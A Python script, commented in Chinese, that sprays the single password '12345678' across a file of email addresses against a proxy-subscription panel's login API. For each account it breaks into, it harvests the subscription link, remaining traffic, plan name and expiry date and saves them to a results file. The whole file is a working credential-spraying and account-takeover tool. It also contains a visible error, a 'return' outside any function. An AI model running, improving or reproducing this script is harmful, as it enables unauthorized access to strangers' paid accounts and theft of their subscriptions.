# -*- coding: utf-8 -*-
import requests
import time
import datetime

# 防止机场面板服务器卡死，不使用并发
proxies = {
    'http': 'http://127.0.0.1:7890',
    'https': 'http://127.0.0.1:7890'
}
headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (HTML, like Gecko) Chrome/108.0.0.0 '
                  'Safari/537.36'}

domain = 'https://xn--4gq62f52gdss.com/'
login_url = domain + 'api/v1/passport/auth/login'
userinfo_link = domain + 'api/v1/user/getSubscribe'

result = []
emails = open('机场users.txt')
for i in emails:
    post_data = {'email': i,
                 'password': '12345678',
                 }
    try:
        s = requests.Session() # 适用于<1.7.1版本
        resp = s.post(url=login_url, data=post_data, headers=headers, proxies=proxies, timeout=20)  # 若存在SSL问题，使用verify=False
        print('页面响应码:', resp.status_code)
        if resp.status_code == 200:
            resp1 = s.get(url=userinfo_link, headers=headers, proxies=proxies, timeout=20)
            print(resp1.text)
            j = resp1.json()["data"]["plan_id"]
            if str(j) != 'None':  # 根据机场套餐id调整
            # if str(j) != 'None' and str(j) != '1':  # 根据机场套餐id调整,当前机场套餐id为1的是体验套餐
                sub_link = resp1.json()["data"]["subscribe_url"]
                traffic_download = resp1.json()["data"]["d"]
                traffic_total = resp1.json()["data"]["transfer_enable"]
                traffic_balance = str(round((traffic_total - traffic_download) / 1024 / 1024 / 1024, 2))
                expired_at = resp1.json()["data"]["expired_at"]
                if str(expired_at) == 'None':
                    expired_at = '未知'
                elif expired_at <= time.time():
                    return  # 过期订阅直接跳过
                else:
                    timeStamp = expired_at
                    dateArray = datetime.datetime.utcfromtimestamp(timeStamp)
                    expired_at = dateArray.strftime("%Y-%m-%d %H:%M:%S")

                sub_plan = resp1.json()["data"]["plan"]["name"]
                sub_plan1 = sub_plan.encode('unicode_escape').decode('unicode_escape')
                result_temp = '账号：' + i + '密码：' + '12345678' + '\n' + '套餐名称：' + sub_plan1 + '\n' + '剩余流量：' + traffic_balance + 'GB' + '\n' + '到期时间：' + expired_at + '\n' + '订阅链接：' + sub_link + '\n\n'
                print(result_temp)
                result.append(result_temp)
                time.sleep(1)
            else:
                continue
        else:
            continue
        resp1.close()
    except RuntimeError as e:
        print('======连接超时，1s后切换下一位用户======')
        time.sleep(1)

with open('机场result_OK.txt', 'a', encoding='UTF-8') as f1:
    for result1 in result:
        f1.write(result1)
